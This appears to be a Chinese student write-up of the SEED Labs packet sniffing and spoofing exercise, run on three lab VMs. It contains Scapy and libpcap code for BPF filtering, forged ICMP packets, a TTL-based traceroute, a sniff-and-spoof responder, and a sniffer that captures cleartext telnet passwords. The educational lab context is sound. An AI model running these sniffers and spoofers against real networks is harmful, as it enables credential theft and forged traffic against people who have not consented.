# 简介
这个实验需要使用到三台虚拟机，其ip地址分别如下所示，虚拟机地址的配置可以参考[官方文档](https://seedsecuritylabs.org/Labs_16.04/Documents/SEEDVM_VirtualBoxManual.pdf)，其启动虚拟机使用的是VirtualBox，但是Vmware配置过程与其区别不大。
```
10.0.2.128- Attacker
10.0.2.129- Victim(主)
10.0.2.130- Victim
```

# task 1.1: Sniffing packet
使用`scapy`模块编写程序如下，保存为文件`mSniff.py` 。
```
#!/usr/bin/python
from scapy.all import *
def print_pkt(pkt):
    pkt.show()

pkt = sniff(filter=’icmp’,prn=print_pkt)

```
## task 1.1A
以`sudo python mSniff.py`运行，因为未接收到任何数据包，程序会发送阻塞。 打开一个新的控制台，使用ping命令，`ping 0.0.0.0`。在`mSniff`控制台下会输出以下信息。

```
###[ Ethernet ]### 
  dst       = 00:00:00:00:00:00
  src       = 00:00:00:00:00:00
  type      = 0x800
###[ IP ]### 
     version   = 4
     ...
     frag      = 0
     ttl       = 64
     proto     = icmp
     chksum    = 0x12cb
     src       = 127.0.0.1
     dst       = 127.0.0.1
     \options   \
###[ ICMP ]### 
        type      = echo-request
        code      = 0
        chksum    = 0xcfe7
        id        = 0x1bb7
        seq       = 0x1
###[ Raw ]### 
           load      = '\x86\x08\x9a]\xf7\xf6\t\x00\x08\t\n\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !"#$%&\'()*+,-./01234567'

```

以上是以 root 权限运行的程序，当不以root权限运行`mSniff`时，`python mSniff.py`,会出现操作不被允许的问题，如下：
```
  File "/usr/lib/python2.7/socket.py", line 191, in __init__
    _sock = _realsocket(family, type, proto)
socket.error: [Errno 1] Operation not permitted

```

## task 1.1B
Scapy 的包过滤器使用BPF（Berkeley Packet Filter）语法。
- 只捕获 ICMP 包
    - filter = `icmp`
- 捕获来自特定IP，以及目标端口是23的任何TCP包
    -  filter = `ip src 10.0.2.129 and tcp and dst port 23`
- 捕获来自或到达特定子网的数据包。 可以选择任何子网，例如128.230.0.0/16; 不应选择VM所连接的子网。
    - filter = `net 128.230`

## Task 1.2: Spoofing ICMP Packets
Scapy可以让我们将IP数据包的字段设置为任意值。在这个部分，我们要用一个任意的IP地址来伪造一个IP包。伪造一个ICMP回显请求数据包，并将这个数据包发送到另一个VM上。
```
# spoofICMP.py
from scapy.all import *
a = IP()
a.dst = "10.0.2.129"
# 默认为回显请求
b = ICMP()
# stack a 和 b 组成一个新的数据包，/被重载，意味着把b最为a的playload，并且修改a中的相应字段。
p = a/b
send(p)
```
构造ICMP包，目标地址改为`10.0.2.129`，在129 VM上打开Wireshark可以捕获到两者之间的传输的数据包如下。然后在`a.dst = "10.0.2.129"`下添加一行语句`a.src="192.168.3.128"`，再次发送，同样能在129 VM上收到该数据包。因此，我们可以通过 scapy 伪造任意的IP数据包。
![ICMP_Rec](_v_images/20191009170809024_7424.png)

## Task 1.3: Traceroute
在这一部分，我们要使用Scapy来估计VM与目标主机之间的距离（路由数量）。原理很简单：就是利用TTL（Time-To-Live）的特性，每经过一个路由器，TTL值就会减去1，当TTL减到0时，这个数据包就会被丢弃，同时该路由器会回发一个ICMP错误信息。因为每次的路由路径可能会不一样，所以我们只能估计VM到目标主机的距离。

自己编写程序，在发送数据包后需要接收数据包，检查是否由目标主机发送回ICMP的回应。一番查找发现scapy有函数`sr`可以实现`send and receive packets`。

> They return a couple of two lists. The first element is a list of couples (packet sent, answer), and the second element is the list of unanswered packets. These two elements are lists, but they are wrapped by an object to present them better, and to provide them with some methods that do most frequently needed actions:

官方给的运行示例如下。
```
>>> sr(IP(dst="192.168.8.1")/TCP(dport=[21,22,23]))
Received 6 packets, got 3 answers, remaining 0 packets
(<Results: UDP:0 TCP:3 ICMP:0 Other:0>, <Unanswered: UDP:0 TCP:0 ICMP:0 Other:0>)

// 实际运行
Received 2 packets, got 1 answers, remaining 0 packets
<Results: TCP:0 UDP:0 ICMP:1 Other:0> <Unanswered: TCP:0 UDP:0 ICMP:0 Other:0>


```
编写一个自动化测试程序，应该是可以正常工作的。但是发现一个奇怪的问题，只有当TTL=1时，发出的ICMP请求才能接收到回复。不知道是不是虚拟机环境配置问题。
```

from scapy.all import *
import sys
ip_dst = sys.argv[1]

if len(sys.argv) < 2:
    print ("[Usage]: python %s dstip" %(sys.argv[0]))
    exit(1)

a = IP()
a.dst = ip_dst
b = ICMP()
isGetDis = 0
mTTL = 1
i = 1
while isGetDis == False :
    a.ttl = mTTL
    ans, unans = sr(a/b)
    if ans.res[0][1].type == 0:
	isGetDis = True
    else:
        i += 1
        mTTL += 1
print ('Get The Distance from VM to ip:%s ,%d '%(ip_dst, i))
```

## Task 1.4: Sniffing and-then Spoofing

```
from scapy.all import *

def print_pkt(pkt):
	a = IP()
	a.src = pkt[IP].dst			
	a.dst = pkt[IP].src		
	b = ICMP()
	b.type ="echo-reply"
	b.code =0
	b.id = pkt[ICMP].id
	b.seq = pkt[ICMP].seq
	p = a/b
	send(p)

pkt = sniff(filter='icmp[icmptype] == icmp-echo', prn=print_pkt)
```
在VM A 上运行以上程序，并且在另一个VM B上运行`ping 120.78.209.0`,可以得到以下打印结果。与正常ping 的结果相比较可以发现VMB 上会得到两次结果返回，一次会被截断（truncated）,第二次（DUP！）表明一个ICMP请求包得到了重复的回复。
```
# sniff and spoof 监控下的结果
[10/10/19]seed@VM:~$ ping 120.78.209.0
PING 120.78.209.0 (120.78.209.0) 56(84) bytes of data.
8 bytes from 120.78.209.0: icmp_seq=1 ttl=64 (truncated)
64 bytes from 120.78.209.0: icmp_seq=1 ttl=128 time=15.7 ms (DUP!)
8 bytes from 120.78.209.0: icmp_seq=2 ttl=64 (truncated)
64 bytes from 120.78.209.0: icmp_seq=2 ttl=128 time=16.2 ms (DUP!)

# 正常ping 结果

[10/10/19]seed@VM:~$ ping 120.78.209.0
PING 120.78.209.0 (120.78.209.0) 56(84) bytes of data.
64 bytes from 120.78.209.0: icmp_seq=1 ttl=128 time=25.3 ms
64 bytes from 120.78.209.0: icmp_seq=2 ttl=128 time=25.7 ms
64 bytes from 120.78.209.0: icmp_seq=3 ttl=128 time=25.2 ms
```
**关于这个部分我有点不太理解，为什么VMA能够监听到 VMB 的ping请求包？**

# Lab Task Set 2: Wirting Program to Sniff and Spoof Packets

## Task 2.1: Writing Packet Sniffing Program
### Task 2.1A: Understanding How a Sniffer Works 
在这个 Task中，我们要写一个 嗅探程序去捕获网络包并且打印出其源/目标IP地址。

参考网站[Programming with pcap](https://www.tcpdump.org/pcap.html)，将IP，Ethernet头部定义结构体完善保存为`header.h`文件。

```
#include <arpa/inet.h>
#ifndef _HEADER_H_
#define _HEADER_H_
/* ethernet headers are always exactly 14 bytes */
#define SIZE_ETHERNET 14
/* Ethernet addresses are 6 bytes */
#define ETHER_ADDR_LEN	6

/* Ethernet header */
struct sniff_ethernet {
	u_char ether_dhost[ETHER_ADDR_LEN]; /* Destination host address */
	u_char ether_shost[ETHER_ADDR_LEN]; /* Source host address */
	u_short ether_type; /* IP? ARP? RARP? etc */
};

/* IP header */
struct sniff_ip {
	u_char ip_vhl;		/* version << 4 | header length >> 2 */
	u_char ip_tos;		/* type of service */
	u_short ip_len;		/* total length */
	u_short ip_id;		/* identification */
	u_short ip_off;		/* fragment offset field */
#define IP_RF 0x8000		/* reserved fragment flag */
#define IP_DF 0x4000		/* dont fragment flag */
#define IP_MF 0x2000		/* more fragments flag */
#define IP_OFFMASK 0x1fff	/* mask for fragmenting bits */
	u_char ip_ttl;		/* time to live */
	u_char ip_p;		/* protocol */
	u_short ip_sum;		/* checksum */
	struct in_addr ip_src,ip_dst; /* source and dest address */
}; 
#endif
```

然后修改文档给出的程序，只需要修改`got_packet()`函数即可，对`packet`进行处理，跳过Ethernet头部，直接读取IP头部分，并且打印输出。关键程序如下。
```
#include <pcap.h>
#include <stdio.h>
#include "header.h"
#include <arpa/inet.h>
void got_packet(u_char * args, const struct pcap_pkthdr *header, const u_char *packet)
{
        struct ethheader *eth = (struct ethheader *)packet;
        struct sniff_ip *ip = (struct sniff_ip *)(packet + SIZE_ETHERNET);
        printf("Ip src:%s,  Ip dst:%s\n",inet_ntoa(ip->ip_src),inet_ntoa(ip->ip_dst));

}
```
编译`gcc sniff.c -o sniff -lpcap`运行程序（要`sudo`），在另外一个VM中`ping`本机` 10.0.2.128`，可得结果。
![pcap](_v_images/20191010153552124_18256.png)

### Questions
1. Q1. use your own words to describe the sequence of the library calls that are essential for sniffer programs. 

```
// 打开对应得网卡开始嗅探
handle = pcap_open_live("ens33", BUFSIZ, 1, 1000, errbuf);
// 将字符串形式的过滤规则编译成BFP形式，保存在fp中
pcap_compile(handle, &fp, filter_exp, 0, net);
// 将filter加入到handle中
pcap_setfilter(handle, &fp);
// 开始监听，当接收到对应规则的数据包时回调 got_packet函数
pcap_loop(handle, -1, got_packet, NULL);
// 关闭监听，释放网卡
pcap_close(handle); //Close the handle
```

2. Q2. Why do you need the root privilege to run a sniffer program? Where does the program fail if it is executed without the root privilege?

如果没有root privilege，执行程序会发生 segmentation fault，因为程序访问了不属于它的内存。不知道具体原因，我认为访问网卡需要root privilege。

3. Q3. 尝试打开和关闭混杂模式，看看程序运行会有什么不同结果。Please describe how you can demonstrate this.

修改`pcap_open_live`中的第三个参数`int promisc`可以开启和关闭混杂模式。如果开启混杂模式，这个机器A就可以监听到另一个机器B ping 任何主机的信息。若关闭，则只能接收到目标IP是A自身的ICMP包。

### Task 2.1B: Wirting Filters
- Capture the ICMP packets between two specific hosts.
`char filter_exp[] = "icmp && host 10.0.2.129 && host 120.78.209.0"`  

当我们直接从B ping A的IP时，不会有任何输出。 只有当从B`10.0.2.129` ping `120.78.209.0`时，攻击者A机器上会输出如下字符。
![包过滤](_v_images/20191010161959965_11399.png)

- Capture the TCP packets with a destination port number in the range from 10 to 100.
`char filter_exp[] = "tcp && dst portrange 10-100"`

### Task 2.1C: Sniffing Passwords
要捕获TCP包，所以我们现在还要在`header.h`文件中加入TCP头的结构体等信息。这个结构体在网站[Programming with pcap](https://www.tcpdump.org/pcap.html)也给出了。
```
/* TCP header */
typedef u_int tcp_seq;

struct sniff_tcp {
	u_short th_sport;	/* source port */
	u_short th_dport;	/* destination port */
	tcp_seq th_seq;		/* sequence number */
	tcp_seq th_ack;		/* acknowledgement number */
	u_char th_offx2;	/* data offset, rsvd */
#define TH_OFF(th)	(((th)->th_offx2 & 0xf0) >> 4)
	u_char th_flags;
#define TH_FIN 0x01
#define TH_SYN 0x02
#define TH_RST 0x04
#define TH_PUSH 0x08
#define TH_ACK 0x10
#define TH_URG 0x20
#define TH_ECE 0x40
#define TH_CWR 0x80
#define TH_FLAGS (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
	u_short th_win;		/* window */
	u_short th_sum;		/* checksum */
	u_short th_urp;		/* urgent pointer */
};
#endif
```
telnet以明文传输密钥，这是一大telnet的缺点。因为telnet使用TCP且端口号23，首先修改包过滤规则`char filter_exp[] = "tcp port 23";`。然后在`got_packet`函数中添加以下语句，其涉及到一步一步把包解开向上传递的过程。
```
// TCP
u_int size_ip = IP_HL(ip)<<2;
const struct sniff_tcp *tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
u_int size_tcp = TH_OFF(tcp)*4;
const char *playload = (u_char *)(packet+SIZE_ETHERNET + size_ip + size_tcp );
if(strlen(playload) != 0) {
        printf("%s",playload);
}
```
在A中编译运行程序。最后我们打开第三台VM C`10.0.2.130`，在B中执行指令`telnet 10.0.2.130`,然后输入账号`seed`，密码`dees`。可以看到在A主机上输出如下信息，成功获得账号密码。可能会有疑问为什么账号重复了一次。这是telnet的回显机制，当B向C发送字符`s`后，C同样会回送一个字符`s`。实际上用户看到的`s`，都是由对方回送过来显示的，并不是你键入就显示的。
![get_passwd](_v_images/20191010164958162_29730.png)


## Task 2.2: Spoofing
### Task 2.2A: Write a spoofing program 

伪造一个源地址为一个并不存在的主机`10.0.2.131`，向广播地址`255.255.255.255`发送一个IP包。这个部分的重点在于要对IP头部各个段进行初始化。重要源代码如下，实际上可以去掉计填充IP头 length 字段的过程，这个在后面的Question部分会实验讨论。
```
    struct in_addr *ip_src = (struct in_addr *)malloc(sizeof(struct in_addr));
    struct in_addr *ip_dst = (struct in_addr *)malloc(sizeof(struct in_addr));
    inet_aton(IP_SRC,ip_src);
    inet_aton(IP_DST,ip_dst);
    len += sizeof(struct sniff_ip);
    ip->ip_vhl = 4<<4 | 5;
    ip->ip_tos = 0;
    // header and data in bytes
    ip->ip_len = htons(len); 
    ip->ip_off = 0;
    ip->ip_ttl = 64;
    ip->ip_p = ICMP_PROTOCOL_NUM;
    ip->ip_src = *ip_src;
    ip->ip_dst = *ip_dst;
    if(sendto(sd, buffer, len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
        printf("sendto() error");
        exit(-1);
    }

```

![2.2a](_v_images/20191010210435218_22914.png)

### Task 2.2B: Spoof an ICMP Echo Request
在`header.h`头文件中添加ICMP头结构体定义`struct sniff_icmp`，伪造一个`srcip=10.0.2.128 and dstip=10.0.2.129`的ICMP包，通过Wireshark可看到包伪造成功并且受到了129主机的回复。

![2.2b](_v_images/20191010212426949_20223.png)

### Questions
1. Q4: 是否可以给IP包长度设定一个任意值？

A4： 在`sock_spoof_icmp.c`中，修改`ip->ip_len = htons(10);`，再次编译执行，发送ICMP包，但是用Wireshark抓包发现其IP头部的`Total Length `仍然等于28。难道socket底层还会对这些值进行校验纠正一次吗？

2. Q5：使用raw socket 编程，是否要计算IP头部的校验和?
A5： 本来就没有对IP头进行校验和字段的填充，但是实际发出的数据包是存在CheckSum的，并且设置Wireshark 对IPv4进行Checksum的校验。
![Q5](_v_images/20191011105319442_13288.png)

3. Q6：为什么要用root权限去执行使用 raw sockets 的程序？ 如果没有 root privilege 会怎么样？
A6： 没有root 权限，程序会终止在 `socket() error: Operation not permitted`。

## Task 2.3:Sniff and spoof
VM A(Attacker)执行sniff and spoof 程序，当VM B `ping IP X`时， 无论目标主机X是否在线，VMB 都需要能接收到ICMP回应包。

VMA回送ICMP的回复包，需要长度大于等于接受到的数据包，也就是要把接收到的数据包中的Data复制后回送。否则在VMB中会出现`8 bytes from 1.2.3.4: icmp_seq=17 ttl=128 (truncated)`问题。所以我们要新添加一个`spoof_icmp`结构体定义如下，除了增加`icmp_data`成员外，与之前写的`sniff_icmp`结构体是一致的。
```
#define ICMP_DATA_LENGTH  14
struct spoof_icmp {
  unsigned char      icmp_type;   // ICMP message type
  unsigned char      icmp_code;   // Error code
  unsigned short int icmp_chksum; //Checksum for ICMP Header and data
  unsigned short int icmp_id;     //Used for identifying request
  unsigned short int icmp_seq;    //Sequence number
  unsigned int icmp_data[ICMP_DATA_LENGTH];   //including timestamp and data
};
```

相对原有spoof代码，重点还要修改ICMP的type（0对应于reply包）、id以及seq域。只有一一对应，VMB端才会接收该回复数据包。
```
struct spoof_icmp *icmp = (struct spoof_icmp *)(buffer + sizeof(struct sniff_ip));

len += sizeof(struct spoof_icmp);
icmp->icmp_type = 0;
icmp->icmp_code = 0;
icmp->icmp_chksum = 0;
icmp->icmp_id = r_icmp->icmp_id; // A real ping should apply the last few bits of pid here
icmp->icmp_seq = r_icmp->icmp_seq;
icmp->icmp_chksum = checksum((unsigned short *)icmp, sizeof(struct spoof_icmp));
for(i = 0; i < ICMP_DATA_LENGTH; i++){
	icmp->icmp_data[i] = r_icmp->icmp_data[i];
}
```
然后将之前写的`sniff.c`的代码copy过来，修改一些关键部分，例如过滤规则，`got_packets`函数等，最终合在一起形成`sniffandspoof.c`文件。在VMA上编译执行程序，然后在VMB上运行`ping 1.2.3.4`(**若VMA不运行程序，这个ping不会等到回复包**)。在VMB上实验现象如下：
![2.3](_v_images/20191011144816189_32725.png)

# 实验总结

本实验原理还是比较容易理解的。sniff阶段，物理上在于利用网卡的混杂模式，可以接收到其他dst不是自身的数据包，从而实现嗅探，软件上数据包的过滤规则BPF也是一大利器。在 spoof 阶段则在于对各种如 IP, TCP，ICMP等协议的数据包的正确构造。修改源IP,目的IP等信息，再发送到攻击目标主机上。而以上程序的实现，需要建立在对TCP/IP的数据包格式进行一定的了解，以及熟悉一些工具的使用，例如Scapy，Pcap，wireshark等。

如何能预防这种攻击呢？我们可以根据此攻击的两个阶段，来制定相应的防御措施。现今网卡开启混杂模式不能再那么轻易的嗅探到网络中的数据包，因为绝大多数路由器和交换机都实现了只向目标转发数据包。当然，这种情况下还有ARP中间人攻击可以实现网络包的截取，这里不展开。 另一种可以将数据包加密，就算攻击者获取了数据包，其也无法获取数据包中的 内容。 另一方面，目前在路由器上已经可以实现对数据包源IP真伪性进行检查（这方面不太了解）。